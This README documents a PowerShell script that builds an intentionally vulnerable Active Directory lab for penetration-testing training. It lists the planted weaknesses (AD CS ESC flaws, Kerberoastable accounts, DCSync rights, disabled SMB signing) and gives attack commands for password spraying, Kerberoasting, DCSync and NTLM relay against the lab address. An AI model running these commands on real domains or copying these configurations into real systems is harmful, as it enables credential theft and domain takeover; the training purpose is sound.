# Hacklab-AD

**Intentionally Vulnerable Active Directory Lab Environment**

A comprehensive PowerShell script for creating an intentionally vulnerable Active Directory environment for security training, penetration testing, and red team exercises.

## ⚠️ **SECURITY WARNING**

**THIS SCRIPT CREATES AN INTENTIONALLY VULNERABLE ENVIRONMENT**
- **NEVER** run this on production systems
- Only use in isolated lab environments
- Contains multiple security vulnerabilities by design
- Disables security features and creates weak configurations

## 🎯 **Purpose**

This script automates the creation of a vulnerable Active Directory domain controller with numerous security misconfigurations, weak passwords, and attack vectors commonly found in real-world environments.

## 📋 **Prerequisites**

- Windows Server 2019/2022/2025
- Administrator privileges
- Minimum 4GB RAM, 60GB disk space
- Isolated network environment
- PowerShell 5.1 or later

## 🚀 **Quick Start**

```powershell
# Download and run the script
.\hacklab-ad.ps1

# Or with custom parameters
.\hacklab-ad.ps1 -DomainName "vulnerable.local" -IPAddress "192.168.1.10"
```

## 🔧 **Parameters**

| Parameter | Description | Default |
|-----------|-------------|---------|
| `DomainName` | Active Directory domain name | `lab.local` |
| `DomainNetbiosName` | NetBIOS domain name | `LAB` |
| `DomainAdminPassword` | Domain administrator password | `P@ssw0rd123` |
| `IPAddress` | Static IP address | `192.168.1.100` |
| `PrefixLength` | Subnet prefix length | `24` |
| `DefaultGateway` | Default gateway IP | `192.168.1.1` |
| `DNSServers` | DNS server addresses | `8.8.8.8,8.8.4.4` |

## 🎭 **Vulnerabilities Included**

### **User Account Vulnerabilities**
- Weak password policies (3 character minimum, no complexity)
- Service accounts with weak passwords and SPNs
- Privileged users with predictable passwords
- Kerberoastable service accounts

### **Active Directory Certificate Services (AD CS)**
- ESC1: Misconfigured certificate templates
- ESC2: Dangerous certificate template permissions
- ESC3: Certificate request agent enrollment
- ESC4: Vulnerable certificate template access control
- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled
- ESC8: NTLM relay to AD CS HTTP endpoints

### **Delegation Vulnerabilities**
- Unconstrained delegation on service accounts
- Constrained delegation misconfigurations
- Resource-based constrained delegation (RBCD)

### **Group Policy Vulnerabilities**
- Vulnerable GPO permissions
- Weak GPO configurations
- Exploitable group policy preferences

### **Network Vulnerabilities**
- LLMNR/NBT-NS poisoning enabled
- SMB signing disabled
- NTLM authentication weakened
- WPAD misconfigurations

### **Privilege Escalation Paths**
- DCSync rights on backup accounts
- DNS Admin privilege escalation
- LAPS bypass configurations
- Machine account quota exploitation

## 🏗️ **Installation Process**

The script performs a multi-stage installation:

1. **Pre-Installation**: Network configuration and computer rename
2. **AD Installation**: Domain controller promotion
3. **Post-Installation**: Vulnerability configuration and user creation

The script automatically handles reboots and resumes from the correct stage.

## 📊 **Created Accounts**

### **Privileged Users**
- `admin.backup` - Domain Admin with DCSync rights
- `service.admin` - Service account with admin privileges
- `dns.admin` - DNS Admin group member

### **Service Accounts**
- `mssql_svc` - SQL Server service account
- `http_svc` - Web service account
- `ftp_svc` - FTP service account
- `oracle_svc` - Oracle database service account

### **Standard Users**
- Multiple users with weak passwords
- Kerberoastable accounts
- Users with various privilege levels

## 🎯 **Attack Scenarios**

### **1. Password Attacks**
```bash
# Password spraying
crackmapexec smb 192.168.1.100 -u users.txt -p passwords.txt

# ASREPRoasting
GetNPUsers.py lab.local/ -usersfile users.txt -no-pass
```

### **2. Kerberoasting**
```bash
# Request service tickets
GetUserSPNs.py lab.local/user:password -request

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

### **3. DCSync Attack**
```bash
# Using admin.backup account
secretsdump.py lab.local/admin.backup:admin@192.168.1.100
```

### **4. Certificate Attacks**
```bash
# ESC1 exploitation
certipy req -username user@lab.local -password password -ca lab-DC-CA -target 192.168.1.100 -template VulnTemplate
```

### **5. NTLM Relay**
```bash
# Relay to AD CS
ntlmrelayx.py -t http://192.168.1.100/certsrv/certfnsh.asp -smb2support --adcs
```

## 🛠️ **Troubleshooting**

### **Common Issues**

**NTLM Authentication Errors**
```powershell
# Run the NTLM fix script if authentication fails
.\Fix-NTLM-AD5.ps1
```

**OU Creation Issues**
- The script now creates OUs before users to prevent timing issues
- Check logs for specific OU creation errors

**Service Account Creation Failures**
- Ensure password policy is configured before user creation
- Check for SPN conflicts

**State File Corruption**
```powershell
# Delete state file and restart
Remove-Item .adlab_state -Force
.\hacklab-ad.ps1
```

### **Log Files**
- Main log: `ADLab_Setup_YYYYMMDD_HHMMSS.log`
- PowerShell transcript: `ADLab_Transcript_YYYYMMDD_HHMMSS.log`
- Password file: `passwords.txt` (created on desktop)

## 🔍 **Verification**

After installation, verify the environment:

```powershell
# Check domain status
Get-ADDomain

# Verify vulnerable users
Get-ADUser -Filter * | Where-Object {$_.Enabled -eq $true}

# Check certificate templates
certlm.msc

# Verify service accounts with SPNs
setspn -Q */*
```

## 🧪 **Testing Tools**

Recommended tools for testing the environment:

- **BloodHound** - AD attack path analysis
- **Impacket** - Python toolkit for network protocols
- **Rubeus** - C# toolset for Kerberos attacks
- **Certify** - AD CS attack tool
- **PowerView** - PowerShell AD enumeration
- **CrackMapExec** - Network service exploitation

## 🤝 **Contributing**

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Test thoroughly in isolated environment
4. Submit a pull request

## 📄 **License**

This project is for educational purposes only. Use responsibly and only in authorized environments.

## 🙏 **Acknowledgments**

- SpecterOps for AD security research
- Will Schroeder (@harmj0y) for PowerView
- Benjamin Delpy for Mimikatz concepts
- The security community for vulnerability research

---

**Remember: This is an intentionally vulnerable environment. Never deploy in production!**
